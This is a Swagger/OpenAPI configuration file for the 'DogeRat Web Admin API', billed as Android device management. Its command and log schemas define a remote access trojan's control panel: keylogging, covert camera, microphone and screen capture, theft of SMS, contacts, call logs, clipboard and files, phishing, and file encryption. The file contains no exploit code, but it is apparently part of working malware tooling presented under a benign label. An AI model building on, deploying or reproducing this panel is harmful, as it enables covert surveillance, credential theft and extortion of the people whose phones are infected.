// Swagger/OpenAPI Configuration
import swaggerJsdoc from 'swagger-jsdoc';
import swaggerUi from 'swagger-ui-express';
import { Express } from 'express';

const options: swaggerJsdoc.Options = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'DogeRat Web Admin API',
      version: '2.0.0',
      description: 'REST API for DogeRat Web Admin Panel - Advanced Android Device Management',
      contact: {
        name: 'DogeRat Team',
        url: 'https://github.com/your-org/dogerat',
      },
      license: {
        name: 'MIT',
        url: 'https://opensource.org/licenses/MIT',
      },
    },
    servers: [
      {
        url: 'http://localhost:5000',
        description: 'Development server',
      },
      {
        url: 'https://api.dogerat.com',
        description: 'Production server',
      },
    ],
    components: {
      securitySchemes: {
        bearerAuth: {
          type: 'http',
          scheme: 'bearer',
          bearerFormat: 'JWT',
          description: 'Enter your JWT token in the format: Bearer <token>',
        },
      },
      schemas: {
        User: {
          type: 'object',
          properties: {
            id: { type: 'string', format: 'uuid' },
            username: { type: 'string', minLength: 3, maxLength: 50 },
            email: { type: 'string', format: 'email' },
            role: { type: 'string', enum: ['admin', 'manager', 'operator', 'viewer'] },
            created_at: { type: 'string', format: 'date-time' },
            updated_at: { type: 'string', format: 'date-time' },
            last_login_at: { type: 'string', format: 'date-time', nullable: true },
          },
        },
        Device: {
          type: 'object',
          properties: {
            id: { type: 'string', format: 'uuid' },
            socket_id: { type: 'string' },
            device_id: { type: 'string' },
            model: { type: 'string' },
            version: { type: 'string' },
            ip: { type: 'string' },
            user_agent: { type: 'string', nullable: true },
            last_seen_at: { type: 'string', format: 'date-time', nullable: true },
            owner_user_id: { type: 'string', format: 'uuid', nullable: true },
            created_at: { type: 'string', format: 'date-time' },
            updated_at: { type: 'string', format: 'date-time' },
            isOnline: { type: 'boolean' },
          },
        },
        Command: {
          type: 'object',
          properties: {
            id: { type: 'string', format: 'uuid' },
            device_id: { type: 'string', format: 'uuid' },
            command: { 
              type: 'string', 
              enum: [
                'contacts', 'sms', 'calls', 'gallery', 'main-camera', 'selfie-camera',
                'microphone', 'screenshot', 'toast', 'vibrate', 'play-audio', 'stop-audio',
                'clipboard', 'sendSms', 'keylogger-on', 'keylogger-off', 'open-url',
                'phishing', 'encrypt', 'decrypt', 'apps', 'file-explorer', 'all-sms', 'popNotification'
              ] 
            },
            params: { type: 'object' },
            status: { type: 'string', enum: ['pending', 'sent', 'ok', 'error', 'timeout'] },
            response: { type: 'object', nullable: true },
            error_message: { type: 'string', nullable: true },
            created_by: { type: 'string', format: 'uuid' },
            created_at: { type: 'string', format: 'date-time' },
            updated_at: { type: 'string', format: 'date-time' },
            executed_at: { type: 'string', format: 'date-time', nullable: true },
          },
        },
        DeviceLog: {
          type: 'object',
          properties: {
            id: { type: 'string', format: 'uuid' },
            device_id: { type: 'string', format: 'uuid' },
            type: {
              type: 'string',
              enum: ['contacts', 'sms', 'calls', 'location', 'clipboard', 'screenshot', 'camera', 'audio', 'gallery', 'keylogger', 'apps', 'file', 'message', 'other'],
            },
            payload: { type: 'object' },
            file_path: { type: 'string', nullable: true },
            created_at: { type: 'string', format: 'date-time' },
          },
        },
        AuditTrail: {
          type: 'object',
          properties: {
            id: { type: 'string', format: 'uuid' },
            user_id: { type: 'string', format: 'uuid' },
            action: { type: 'string' },
            target_id: { type: 'string', nullable: true },
            target_type: { type: 'string', nullable: true },
            metadata: { type: 'object' },
            ip_address: { type: 'string', nullable: true },
            user_agent: { type: 'string', nullable: true },
            timestamp: { type: 'string', format: 'date-time' },
          },
        },
        Error: {
          type: 'object',
          properties: {
            error: { type: 'string' },
            message: { type: 'string' },
            details: { type: 'array', items: { type: 'object' } },
          },
        },
      },
    },
    security: [
      {
        bearerAuth: [],
      },
    ],
    tags: [
      { name: 'Authentication', description: 'User authentication endpoints' },
      { name: 'Users', description: 'User management (Admin only)' },
      { name: 'Devices', description: 'Device management and control' },
      { name: 'Audit', description: 'Audit trail and logs' },
      { name: 'Upload', description: 'File upload/download' },
      { name: 'Health', description: 'Health check endpoints' },
    ],
  },
  apis: ['./server/routes/*.ts', './server/index.ts'], // Path to API docs
};

const swaggerSpec = swaggerJsdoc(options);

/**
 * Setup Swagger UI
 */
export function setupSwagger(app: Express): void {
  // Swagger UI
  app.use(
    '/api-docs',
    swaggerUi.serve,
    swaggerUi.setup(swaggerSpec, {
      customCss: '.swagger-ui .topbar { display: none }',
      customSiteTitle: 'DogeRat API Documentation',
    })
  );

  // Swagger JSON spec
  app.get('/api-docs.json', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.send(swaggerSpec);
  });

  console.log('📚 Swagger documentation available at /api-docs');
}

export default setupSwagger;

/**
 * API Documentation Examples (JSDoc format for swagger-jsdoc)
 * 
 * Add these above your route definitions:
 * 
 * @swagger
 * /api/auth/login:
 *   post:
 *     summary: User login
 *     tags: [Authentication]
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - username
 *               - password
 *             properties:
 *               username:
 *                 type: string
 *               password:
 *                 type: string
 *     responses:
 *       200:
 *         description: Login successful
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 message:
 *                   type: string
 *                 token:
 *                   type: string
 *                 user:
 *                   $ref: '#/components/schemas/User'
 *       401:
 *         description: Invalid credentials
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/Error'
 */

